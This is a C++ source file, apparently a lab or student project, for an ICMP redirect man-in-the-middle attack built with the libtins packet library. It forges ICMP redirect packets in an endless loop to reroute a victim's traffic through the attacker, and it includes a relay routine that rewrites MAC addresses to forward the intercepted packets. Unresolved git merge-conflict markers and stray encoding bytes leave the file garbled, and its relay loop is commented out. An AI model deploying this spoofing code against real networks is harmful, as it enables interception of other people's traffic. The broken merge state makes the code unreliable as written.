<<<<<<< HEAD
癤�#define TINS_STATIC
=======
#define TINS_STATIC
>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
#include <tins/tins.h>
#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <string>
<<<<<<< HEAD
#include <thread>
=======
>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#else
#include <unistd.h>
#endif // _WIN32
using namespace std;
using namespace Tins;
using std::cout;
using std::runtime_error;
using std::endl;

<<<<<<< HEAD
void icmp_redirect(NetworkInterface iface, IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip, const NetworkInterface::Info& info)
=======

//다음 진행 : relay
//윈도우 7이상은 라우터 테이블에 리다이렉트 경로를 따로 지정하지 않음으로 계속적으로 보내주어야 한다.
//TCP 가 오면 그 패킷을 relay 시켜주는 작업진행


void icmp_redirect(NetworkInterface iface,IPv4Address gw, IPv4Address attack, IPv4Address victim, IPv4Address webip,const NetworkInterface::Info& info)
>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
{
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw;
	attack_hw = info.hw_addr; // my macaddress get
	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
	cout << " Using victim hw address:  " << victim_hw << "\n";
	cout << " Using own hw address:     " << info.hw_addr << "\n";
	ICMP icmp;
	icmp.set_redirect(1, (IPv4Address)htonl(attack));
<<<<<<< HEAD
	uint8_t *data;
	data = (uint8_t *)malloc(8);
	memset(data, NULL, 8);
	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(data, 8);

=======
	cout << icmp.gateway() << endl;
	uint8_t *a;
	a =(uint8_t *)malloc(8);
	memset(a, NULL,8);	
	EthernetII do_icmp = EthernetII(victim_hw, attack_hw) / IP(victim, gw) / icmp / IP(webip, victim) / RawPDU(a, 8);
	
>>>>>>> d589ddcbf609d1767dd71b3cd2d97f037efe1c73
	while (true) {
		sender.send(do_icmp, iface);
#ifdef _WIN32
		Sleep(1);
#else
		sleep(5);
#endif
	}
}
void relay(PDU *some_pdu, NetworkInterface iface, IPv4Address victim, EthernetII::address_type attack_hw, EthernetII::address_type victim_hw, EthernetII::address_type gw_hw)
{
	
	PacketSender sender;
	EthernetII *eth = some_pdu->find_pdu<EthernetII>();
	IP *ip = some_pdu->find_pdu<IP>();
	//TCP *tcp = some_pdu->find_pdu<TCP>();
	
	
	if(ip != NULL)
	{
		if(eth->dst_addr().to_string() == attack_hw.to_string())
		{
		if(eth->src_addr().to_string() == victim_hw.to_string() && ip->dst_addr() == victim)
		{
		cout << "victim -> attack " << endl;
		cout << "eth src :" << eth->src_addr() << endl;
		cout << "eth dst :" << eth->dst_addr() << endl;
		cout << "SRC ip :" << ip->src_addr() << endl;
		cout << "dst ip :" << ip->dst_addr() << endl;
		eth->src_addr(attack_hw);
		eth->dst_addr(gw_hw);
		some_pdu->send(sender, iface.name());
		}
		
		else if (eth->src_addr().to_string() == gw_hw.to_string() && ip->src_addr() == victim)
		{
		cout << "attack -> victim " << endl;
		cout << "eth src :" << eth->src_addr() << endl;
		cout << "eth dst :" << eth->dst_addr() << endl;
		cout << "SRC ip :" << ip->src_addr() << endl;
		cout << "dst ip :" << ip->dst_addr() << endl;
		eth->src_addr(attack_hw);
		eth->dst_addr(victim_hw);
		some_pdu->send(sender, iface.name());
		}
		}
	}
}
/*
bool relay(PDU &some_pdu)
{
	EthernetII eth = some_pdu.rfind_pdu<EthernetII>();
	IP ip = some_pdu.rfind_pdu<IP>();
	TCP tcp = some_pdu.rfind_pdu<TCP>();
	cout << eth.src_addr() << endl;
	cout << eth.dst_addr() << endl;
	cout << ip.src_addr() << endl;
	cout << ip.dst_addr() << endl;
	return true;
}
*/

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage: " << *argv << " <Gateway> <Attack> <Victim> <Default>" << endl;
		return 1;
	}
	PacketSender sender;
	EthernetII::address_type attack_hw, victim_hw, gw_hw;
	IPv4Address gw, victim, attack, web_ip;
	
	
	try {
		gw = argv[1];
		attack = argv[2];
		victim = argv[3];
		web_ip = argv[4];

		cout << "gate way ip : " << gw << endl;
		cout << "attack ip : " << attack << endl;
		cout << "victim ip : " << victim << endl;
		cout << "web ip : " << web_ip << endl;
	}
	catch (...) {
		cout << "Invalid ip found...\n";
		return 2;
	}
	NetworkInterface iface;
	NetworkInterface::Info info;
	try {
		iface = gw;
		info = iface.addresses();
		attack_hw = info.hw_addr;
	}
	catch (runtime_error& ex) {
		cout << ex.what() << endl;
		return 3;
	}
	victim_hw = Utils::resolve_hwaddr(iface, victim, sender); // victim macaddress get
	gw_hw =  Utils::resolve_hwaddr(iface, gw, sender); // gateway macaddress get
	try {
		std::thread infect(icmp_redirect,iface,gw,attack,victim,web_ip,info);
		infect.detach();
		//icmp_redirect(iface, gw, attack, victim, web_ip, info);
	}
	catch (runtime_error& ex) {
		cout << "Runtime error: " << ex.what() << endl;
		return 7;
	}
	Sniffer sniff(iface.name());
	cout << "relay.." << endl;
	while(true)
	{
	//PDU *pdu = sniff.next_packet();
	//relay(pdu,iface,victim,attack_hw,victim_hw,gw_hw);
	}
}